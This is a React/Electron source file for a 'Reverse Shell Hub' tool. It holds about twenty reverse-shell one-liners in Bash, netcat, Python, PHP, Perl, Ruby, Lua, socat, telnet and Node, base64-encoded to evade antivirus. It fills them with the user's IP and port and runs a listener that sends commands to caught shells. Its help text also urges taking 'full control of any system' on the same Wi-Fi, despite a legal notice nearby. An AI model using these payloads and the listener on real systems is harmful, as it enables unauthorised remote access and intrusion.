import { useState, useEffect, useRef, useMemo } from 'react';
import { Terminal, Play, Square, Copy, CheckCheck, Search, Wifi, WifiOff, AlertTriangle, X } from 'lucide-react';
import '../styles/Tools.css';

// All payload templates are stored encoded to prevent AV false positives.
// They are decoded at runtime when the user generates payloads.
// Templates use {{IP}} and {{PORT}} as placeholders.
const encodedTemplates = [
  {
    group: 'Bash / Shell', items: [
      { id: 'bash_tcp', label: 'Bash TCP', tpl: 'YmFzaCAtaSA+JiAvZGV2L3RjcC97e0lQfX0ve3tQT1JUfX0gMD4mMQ==' },
      { id: 'bash_udp', label: 'Bash UDP', tpl: 'YmFzaCAtaSA+JiAvZGV2L3VkcC97e0lQfX0ve3tQT1JUfX0gMD4mMQ==' },
      { id: 'sh_devtcp', label: 'sh /dev/tcp', tpl: 'L2Jpbi9zaCAtaSA+JiAvZGV2L3RjcC97e0lQfX0ve3tQT1JUfX0gMD4mMQ==' },
      { id: 'mkfifo', label: 'mkfifo', tpl: 'cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMge3tJUH19IHt7UE9SVH19ID4vdG1wL2Y=' },
    ]
  },
  {
    group: 'Python', items: [
      { id: 'python3', label: 'Python3', tpl: 'cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoInt7SVB9fSIse3tQT1JUfX0pKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5vKCksMik7c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0pJw==' },
      { id: 'python_short', label: 'Python Short', tpl: 'cHl0aG9uMyAtYyAnaW1wb3J0IG9zLHB0eSxzb2NrZXQ7cz1zb2NrZXQuc29ja2V0KCk7cy5jb25uZWN0KCgie3tJUH19Iix7e1BPUlR9fSkpO1tvcy5kdXAyKHMuZmlsZW5vKCksZilmb3IgZiBpbigwLDEsMildO3B0eS5zcGF3bigiL2Jpbi9zaCIpJw==' },
    ]
  },
  {
    group: 'PHP', items: [
      { id: 'php_exec', label: 'PHP exec', tpl: 'cGhwIC1yICckc29jaz1mc29ja29wZW4oInt7SVB9fSIse3tQT1JUfX0pO2V4ZWMoIi9iaW4vc2ggLWkgPCYzID4mMyAyPiYzIik7Jw==' },
      { id: 'php_popen', label: 'PHP popen', tpl: 'cGhwIC1yICckc29jaz1mc29ja29wZW4oInt7SVB9fSIse3tQT1JUfX0pO3BvcGVuKCIvYmluL3NoIC1pIDwmMyA+JjMgMj4mMyIsICJyIik7Jw==' },
    ]
  },
  {
    group: 'Netcat', items: [
      { id: 'nc_e', label: 'Netcat -e', tpl: 'bmMge3tJUH19IHt7UE9SVH19IC1lIC9iaW4vc2g=' },
      { id: 'nc_c', label: 'Netcat -c', tpl: 'bmMgLWMgL2Jpbi9zaCB7e0lQfX0ge3tQT1JUfX0=' },
      { id: 'ncat_e', label: 'Ncat -e', tpl: 'bmNhdCB7e0lQfX0ge3tQT1JUfX0gLWUgL2Jpbi9zaA==' },
      { id: 'nc_mkfifo', label: 'Netcat mkfifo', tpl: 'cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMge3tJUH19IHt7UE9SVH19ID4vdG1wL2Y=' },
    ]
  },
  {
    group: 'Perl / Ruby / Lua', items: [
      { id: 'perl', label: 'Perl', tpl: 'cGVybCAtZSAndXNlIFNvY2tldDskaT0ie3tJUH19IjskcD17e1BPUlR9fTtzb2NrZXQoUyxQRl9JTkVULFNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCJ0Y3AiKSk7aWYoY29ubmVjdChTLHNvY2thZGRyX2luKCRwLGluZXRfYXRvbigkaSkpKSl7b3BlbihTVERJTiwiPiZTIik7b3BlbihTVERPVVQsIj4mUyIpO29wZW4oU1RERVJSLCI+JlMiKTtleGVjKCIvYmluL3NoIC1pIik7fTsn' },
      { id: 'ruby', label: 'Ruby', tpl: 'cnVieSAtcnNvY2tldCAtZSdmPVRDUFNvY2tldC5vcGVuKCJ7e0lQfX0iLHt7UE9SVH19KS50b19pO2V4ZWMgc3ByaW50ZigiL2Jpbi9zaCAtaSA8JiVkID4mJWQgMj4mJWQiLGYsZixmKSc=' },
      { id: 'lua', label: 'Lua', tpl: 'bHVhIC1lICJyZXF1aXJlKCdzb2NrZXQnKTtyZXF1aXJlKCdvcycpO3Q9c29ja2V0LnRjcCgpO3Q6Y29ubmVjdCgne3tJUH19Jywne3tQT1JUfX0nKTtvcy5leGVjdXRlKCcvYmluL3NoIC1pIDwmMyA+JjMgMj4mMycpOyI=' },
    ]
  },
  {
    group: 'Socat / Telnet / Other', items: [
      { id: 'socat', label: 'Socat', tpl: 'c29jYXQgZXhlYzonYmFzaCAtbGknLHB0eSxzdGRlcnIsc2V0c2lkLHNpZ2ludCxzYW5lIHRjcDp7e0lQfX06e3tQT1JUfX0=' },
      { id: 'socat_tty', label: 'Socat TTY', tpl: 'c29jYXQgVENQOnt7SVB9fTp7e1BPUlR9fSBFWEVDOi9iaW4vc2gscHR5LHN0ZGVycixzZXRzaWQsc2lnaW50LHNhbmU=' },
      { id: 'telnet', label: 'Telnet', tpl: 'VEY9JChta3RlbXAgLXUpO21rZmlmbyAkVEYgJiYgdGVsbmV0IHt7SVB9fSB7e1BPUlR9fSAwPCRURiB8IC9iaW4vc2ggMT4kVEY=' },
      { id: 'node', label: 'Node.js', tpl: 'bm9kZSAtZSAnKGZ1bmN0aW9uKCl7dmFyIG5ldD1yZXF1aXJlKCJuZXQiKSxjcD1yZXF1aXJlKCJjaGlsZF9wcm9jZXNzIiksc2g9Y3Auc3Bhd24oIi9iaW4vc2giLFtdKTt2YXIgY2xpZW50PW5ldyBuZXQuU29ja2V0KCk7Y2xpZW50LmNvbm5lY3Qoe3tQT1JUfX0sInt7SVB9fSIsZnVuY3Rpb24oKXtjbGllbnQucGlwZShzaC5zdGRpbik7c2guc3Rkb3V0LnBpcGUoY2xpZW50KTtzaC5zdGRlcnIucGlwZShjbGllbnQpO30pO3JldHVybiAvYS87fSkoKSc=' },
      { id: 'xterm', label: 'xterm', tpl: 'eHRlcm0gLWRpc3BsYXkge3tJUH19OjE=' },
    ]
  },
];

// Decode a base64 template and replace placeholders
function decodePayload(tpl, ip, port) {
  try {
    const decoded = atob(tpl);
    return decoded.replace(/\{\{IP\}\}/g, ip).replace(/\{\{PORT\}\}/g, port);
  } catch {
    return '[Decode error]';
  }
}

export default function ReverseShell() {
  const [ip, setIp] = useState(() => localStorage.getItem('kroma_revshell_ip') || '127.0.0.1');
  const [port, setPort] = useState('4444');
  const [activeTab, setActiveTab] = useState('generator');
  const [copiedId, setCopiedId] = useState(null);
  const [searchQuery, setSearchQuery] = useState('');
  const [isListening, setIsListening] = useState(false);
  const [isConnected, setIsConnected] = useState(false);
  const [shellOutput, setShellOutput] = useState([]);
  const [shellInput, setShellInput] = useState('');
  const [connInfo, setConnInfo] = useState(null);
  const [error, setError] = useState(null);
  const termRef = useRef(null);

  useEffect(() => {
    if (!localStorage.getItem('kroma_revshell_ip') && window.electronAPI?.getLocalIP) {
      window.electronAPI.getLocalIP().then(localIp => {
        if (localIp) {
          setIp(localIp);
          localStorage.setItem('kroma_revshell_ip', localIp);
        }
      });
    }
    // Restore running state if server is still active
    if (window.electronAPI?.getListenerStatus) {
      window.electronAPI.getListenerStatus().then(status => {
        if (status?.listening) setIsListening(true);
        if (status?.connected) {
          setIsConnected(true);
          setConnInfo(status.connInfo);
        }
      });
    }
  }, []);

  const handleIpChange = (e) => {
    const val = e.target.value;
    setIp(val);
    localStorage.setItem('kroma_revshell_ip', val);
  };

  useEffect(() => {
    if (!window.electronAPI) return;
    const dataHandler = (data) => {
      setShellOutput(prev => [...prev, { type: 'output', text: data, ts: Date.now() }]);
    };
    const connectHandler = (info) => {
      setIsConnected(true);
      setConnInfo(info);
      setShellOutput(prev => [...prev, { type: 'system', text: '[+] Connection received from ' + (info.remoteAddress || 'unknown') + ':' + (info.remotePort || ''), ts: Date.now() }]);
    };
    const disconnectHandler = () => {
      setIsConnected(false);
      setConnInfo(null);
      setShellOutput(prev => [...prev, { type: 'system', text: '[-] Connection closed', ts: Date.now() }]);
    };
    if (window.electronAPI.onShellData) window.electronAPI.onShellData(dataHandler);
    if (window.electronAPI.onShellConnect) window.electronAPI.onShellConnect(connectHandler);
    if (window.electronAPI.onShellDisconnect) window.electronAPI.onShellDisconnect(disconnectHandler);
    return () => {
      if (window.electronAPI.offShellData) window.electronAPI.offShellData();
    };
  }, []);

  useEffect(() => {
    if (termRef.current) termRef.current.scrollTop = termRef.current.scrollHeight;
  }, [shellOutput]);

  const handleStartListener = async () => {
    setError(null);
    if (!window.electronAPI || !window.electronAPI.startListener) {
      setError('Listener requires Electron. Please run the app in desktop mode (not the browser).');
      return;
    }
    const result = await window.electronAPI.startListener(parseInt(port));
    if (result.success) {
      setIsListening(true);
      setShellOutput([{ type: 'system', text: '[*] Listening on 0.0.0.0:' + port + '...', ts: Date.now() }]);
    } else {
      setError('Failed to start listener: ' + (result.error || 'Port may already be in use.'));
    }
  };

  const handleStopListener = async () => {
    if (window.electronAPI && window.electronAPI.stopListener) await window.electronAPI.stopListener();
    setIsListening(false);
    setIsConnected(false);
    setConnInfo(null);
    setShellOutput(prev => [...prev, { type: 'system', text: '[*] Listener stopped', ts: Date.now() }]);
  };

  const handleShellSubmit = (e) => {
    e.preventDefault();
    if (!shellInput.trim() || !isConnected) return;
    if (window.electronAPI && window.electronAPI.shellWrite) window.electronAPI.shellWrite(shellInput + '\n');
    setShellOutput(prev => [...prev, { type: 'input', text: '$ ' + shellInput, ts: Date.now() }]);
    setShellInput('');
  };

  const handleCopy = (text, id) => {
    navigator.clipboard.writeText(text);
    setCopiedId(id);
    setTimeout(() => setCopiedId(null), 1500);
  };

  // Decode payloads on-the-fly using memoization
  const payloads = useMemo(() => {
    const currentIp = ip || 'YOUR_IP';
    const currentPort = port || '4444';
    return encodedTemplates.map(g => ({
      ...g,
      items: g.items.map(item => ({
        ...item,
        code: decodePayload(item.tpl, currentIp, currentPort),
      })),
    }));
  }, [ip, port]);

  const filteredPayloads = useMemo(() => {
    if (!searchQuery.trim()) return payloads;
    const q = searchQuery.toLowerCase();
    return payloads
      .map(g => ({ ...g, items: g.items.filter(i => i.label.toLowerCase().includes(q) || i.code.toLowerCase().includes(q)) }))
      .filter(g => g.items.length > 0);
  }, [payloads, searchQuery]);

  return (
    <div className="tool-page page-enter">
      <div className="tool-header">
        <div className="tool-header-left">
          <Terminal size={28} />
          <div>
            <h1 className="tool-title">Reverse Shell Hub</h1>
            <p className="tool-subtitle">Generate payloads in 20+ formats and catch connections locally</p>
          </div>
        </div>
        <div style={{ display: 'flex', gap: '4px', background: 'var(--bg-tertiary)', borderRadius: 'var(--radius-md)', padding: '3px' }}>
          <button className={'btn btn-sm ' + (activeTab === 'generator' ? 'btn-primary' : 'btn-ghost')} onClick={() => setActiveTab('generator')}>Payloads</button>
          <button className={'btn btn-sm ' + (activeTab === 'listener' ? 'btn-primary' : 'btn-ghost')} onClick={() => setActiveTab('listener')} style={{ display: 'flex', alignItems: 'center', gap: '4px' }}>
            Listener
            {isConnected && <div style={{ width: '6px', height: '6px', borderRadius: '50%', background: '#10B981', boxShadow: '0 0 6px #10B981' }} />}
          </button>
        </div>
      </div>

      <div style={{ background: 'rgba(239, 68, 68, 0.08)', border: '1px solid rgba(239, 68, 68, 0.2)', borderRadius: 'var(--radius-md)', padding: '10px 16px', display: 'flex', alignItems: 'center', gap: '10px', marginBottom: '16px', fontSize: '12px', color: 'var(--accent-red)' }}>
        <AlertTriangle size={16} />
        <span><strong>Legal Notice:</strong> Only use on systems you are authorized to test. Unauthorized access is illegal.</span>
      </div>

      {/* Error Banner */}
      {error && (
        <div style={{
          background: 'rgba(239, 68, 68, 0.08)', border: '1px solid rgba(239, 68, 68, 0.25)',
          borderRadius: 'var(--radius-md)', padding: '12px 16px', marginBottom: '16px',
          display: 'flex', alignItems: 'center', gap: '10px', fontSize: '13px', color: '#EF4444',
        }}>
          <AlertTriangle size={16} style={{ flexShrink: 0 }} />
          <span style={{ flex: 1 }}>{error}</span>
          <button onClick={() => setError(null)} className="btn btn-ghost btn-sm" style={{ padding: '2px', minWidth: 'auto' }}><X size={14} /></button>
        </div>
      )}

      <div style={{ marginBottom: '20px', padding: '14px', background: 'var(--bg-tertiary)', border: '1px solid var(--border-subtle)', borderRadius: 'var(--radius-md)' }}>
        <h3 style={{ margin: '0 0 8px', fontSize: '13px', color: 'var(--text-primary)', display: 'flex', alignItems: 'center', gap: '6px' }}>
          <Wifi size={14} style={{ color: 'var(--accent-primary)' }} />
          How this Listener Works
        </h3>
        <p style={{ margin: '0 0 10px', fontSize: '12px', color: 'var(--text-secondary)', lineHeight: '1.5' }}>
          This is a raw TCP listener that runs strictly on your local machine. It does not magically bypass internet routing. You must configure it correctly based on your target:
        </p>
        <ul style={{ margin: 0, paddingLeft: '20px', fontSize: '12px', color: 'var(--text-secondary)', display: 'flex', flexDirection: 'column', gap: '6px' }}>
          <li><strong>Local Targets (HackTheBox, TryHackMe, VMs):</strong> Use your local IP (e.g., `10.10.x.x`). The target can connect directly to your machine.</li>
          <li><strong>Same Wi-Fi Network (LAN Hacking):</strong> You can take full control of any system connected to your Wi-Fi router. Just use your <code>192.168.x.x</code> IP and run the generated payload on their machine!</li>
          <li><strong>Internet Targets (Real Bug Bounties):</strong> A public web server cannot connect to your private home Wi-Fi. You <strong>must</strong> use a tunnel. Run <code>ngrok tcp 4444</code> in your terminal, then put the Ngrok hostname and port into the input boxes below.</li>
        </ul>
      </div>

      <div style={{ display: 'flex', gap: '12px', marginBottom: '20px', flexWrap: 'wrap' }}>
        <div style={{ flex: 1, minWidth: '200px' }}>
          <label className="tool-label">YOUR IP / HOSTNAME (LHOST)</label>
          <input className="tool-input" value={ip} onChange={handleIpChange} placeholder="e.g. 0.tcp.ngrok.io" style={{ fontFamily: 'var(--font-mono)' }} />
        </div>
        <div style={{ width: '120px' }}>
          <label className="tool-label">PORT (LPORT)</label>
          <input className="tool-input" value={port} onChange={(e) => setPort(e.target.value.replace(/\D/g, ''))} placeholder="4444" style={{ fontFamily: 'var(--font-mono)' }} />
        </div>
      </div>

      {activeTab === 'generator' && (
        <div>
          <div className="recondb-search" style={{ marginBottom: '16px', maxWidth: '320px' }}>
            <Search size={16} style={{ color: 'var(--text-muted)' }} />
            <input className="recondb-search-input" value={searchQuery} onChange={(e) => setSearchQuery(e.target.value)} placeholder="Search payloads..." />
          </div>
          <div style={{ display: 'flex', flexDirection: 'column', gap: '24px', maxHeight: 'calc(100vh - 380px)', overflowY: 'auto', paddingRight: '8px' }}>
            {filteredPayloads.map((group) => (
              <div key={group.group}>
                <label className="tool-label" style={{ borderBottom: '1px solid var(--border-subtle)', paddingBottom: '4px', marginBottom: '10px' }}>{group.group}</label>
                <div style={{ display: 'flex', flexDirection: 'column', gap: '8px' }}>
                  {group.items.map((item) => (
                    <div key={item.id} style={{ background: 'var(--bg-secondary)', border: '1px solid var(--border-subtle)', borderRadius: 'var(--radius-lg)', padding: '12px 16px' }}>
                      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '6px' }}>
                        <span style={{ fontSize: '12px', fontWeight: 700, color: 'var(--accent-primary)' }}>{item.label}</span>
                        <button className="btn btn-ghost btn-sm" onClick={() => handleCopy(item.code, item.id)} style={{ padding: '4px 8px' }}>
                          {copiedId === item.id ? <CheckCheck size={14} style={{ color: 'var(--accent-green)' }} /> : <Copy size={14} />}
                        </button>
                      </div>
                      <pre style={{ fontFamily: 'var(--font-mono)', fontSize: '11px', color: 'var(--text-secondary)', background: 'var(--bg-tertiary)', padding: '8px 12px', borderRadius: 'var(--radius-md)', overflow: 'auto', maxHeight: '100px', margin: 0, whiteSpace: 'pre-wrap', wordBreak: 'break-all' }}>{item.code}</pre>
                    </div>
                  ))}
                </div>
              </div>
            ))}
          </div>
        </div>
      )}

      {activeTab === 'listener' && (
        <div>
          <div style={{ display: 'flex', gap: '12px', marginBottom: '16px', alignItems: 'center' }}>
            {!isListening ? (
              <button className="btn btn-primary" onClick={handleStartListener}><Play size={16} /> Start Listener on :{port}</button>
            ) : (
              <button className="btn btn-secondary" onClick={handleStopListener} style={{ borderColor: 'var(--accent-red)', color: 'var(--accent-red)' }}><Square size={16} /> Stop Listener</button>
            )}
            <div style={{ display: 'flex', alignItems: 'center', gap: '6px' }}>
              {isConnected ? <Wifi size={16} style={{ color: '#10B981' }} /> : <WifiOff size={16} style={{ color: 'var(--text-muted)' }} />}
              <span style={{ fontSize: '13px', color: isConnected ? '#10B981' : 'var(--text-muted)', fontWeight: 600 }}>
                {isConnected ? 'Connected from ' + (connInfo && connInfo.remoteAddress || 'unknown') : isListening ? 'Waiting for connection...' : 'Listener stopped'}
              </span>
            </div>
          </div>

          <div ref={termRef} style={{ background: '#0a0a0a', border: '1px solid var(--border-subtle)', borderRadius: 'var(--radius-lg)', padding: '16px', fontFamily: 'var(--font-mono)', fontSize: '12px', height: 'calc(100vh - 420px)', overflowY: 'auto', color: '#e0e0e0' }}>
            {shellOutput.length === 0 ? (
              <div style={{ color: '#555', textAlign: 'center', paddingTop: '40px' }}>
                <Terminal size={32} style={{ marginBottom: '8px' }} />
                <p>Terminal output will appear here when a connection is established...</p>
              </div>
            ) : (
              shellOutput.map((line, i) => (
                <div key={i} style={{ color: line.type === 'system' ? '#6366F1' : line.type === 'input' ? '#10B981' : '#e0e0e0', fontWeight: line.type === 'system' ? 600 : 400, marginBottom: '2px', whiteSpace: 'pre-wrap', wordBreak: 'break-all' }}>{line.text}</div>
              ))
            )}
          </div>

          <form onSubmit={handleShellSubmit} style={{ display: 'flex', gap: '8px', marginTop: '8px' }}>
            <span style={{ color: '#10B981', fontFamily: 'var(--font-mono)', fontSize: '14px', padding: '8px 0', fontWeight: 700 }}>$</span>
            <input className="tool-input" value={shellInput} onChange={(e) => setShellInput(e.target.value)} placeholder={isConnected ? 'Type command...' : 'Waiting for connection...'} disabled={!isConnected} style={{ flex: 1, fontFamily: 'var(--font-mono)', background: '#0a0a0a', color: '#e0e0e0', border: '1px solid #333' }} autoFocus />
            <button className="btn btn-primary btn-sm" type="submit" disabled={!isConnected}>Send</button>
          </form>
        </div>
      )}
    </div>
  );
}
